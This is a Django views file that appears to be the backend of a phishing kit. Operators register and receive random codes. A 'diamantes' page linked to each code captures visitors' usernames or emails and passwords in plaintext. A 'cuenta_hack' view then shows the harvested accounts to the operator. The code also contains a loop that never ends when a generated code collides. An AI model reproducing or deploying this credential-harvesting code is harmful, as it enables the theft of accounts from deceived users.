import random
from decimal import *
from django.shortcuts import render, redirect
from django.http import HttpResponse
from django.contrib.auth.models import User
from django.contrib.auth import login, logout, authenticate
from .models import perfilnk, cuentas
from .forms import perfilform


# Create your views here.
def signup(request):
	if request.method == 'GET':
		return render(request, 'signup.html')
	else:
		if request.POST['contraseña1'] == request.POST['contraseña2']:
			try:
				user =User.objects.create_user(username=request.POST['nombre'],password=request.POST['contraseña1'])
				user.save()
				login(request, user)
				return redirect('perfil')
			except:
				return render(request, 'signup.html',{"error":"el usuario ya existe"})
		return render(request, 'signup.html',{"error":"las contraseñas no coinciden"})





def signin(request):
	if request.method == 'GET':
		return render(request, 'signin.html')
	else:
		user = authenticate(request,username=request.POST['nombre'],password=request.POST['contraseña'])
		if user is None:
			return render(request,'signin.html',{"error":"Usuario o contraseña incorrectos"})
		else:
			login(request, user)
			return redirect('perfil')

def signout(request):
	logout(request)
	return redirect('signin')



def perfil(request):
	if request.method == 'GET':
		dataperfil = perfilnk.objects.filter(user=request.user)
		formperfil = list(dataperfil)
		counp = len(formperfil)
		for i in dataperfil:
			print (i.codigo)
		return render(request,'perfil.html',{'form':perfilform,'perfil':dataperfil, 'lent':counp})
	else:
		dataperfil = perfilnk.objects.filter(user=request.user)
		formperfil = list(dataperfil)
		counp = len(formperfil)

		perfilsave = perfilform(request.POST)
		new_perfil = perfilsave.save(commit=False)
		idra= random.random()*1000000
		red = round(idra)
		datos =[]
		for i in dataperfil:
			datos.append(i.codigo)
		while red in datos:
			print ('el codigo ya existe vuelve a enviar los datos')
		else:
			new_perfil.codigo=red
			#new_perfil.desayuno=False
			new_perfil.user = request.user
			new_perfil.save()
		return redirect('perfil')



def home(request):
  return render(request, 'index.html')


def cuenta_hack(request):
	dataperfil = perfilnk.objects.filter(user=request.user)
	for i in dataperfil:
		datacuentas = cuentas.objects.filter(codigo=i.codigo)
	return render(request,'cuentas.html',{'cuentas':datacuentas})



def diamantes(request, diamantes_id):
	if request.method == 'GET':
		return render(request, 'diamantes.html',{'datox':diamantes_id})

	else:
		datacuentas = cuentas.objects.all()
		formcuentas = cuentas()
		formcuentas.correo = request.POST['username']
		formcuentas.passwordi = request.POST['pass']
		formcuentas.codigo = diamantes_id
		formcuentas.save()
		return render(request, 'diamantes.html',{'datox':diamantes_id})

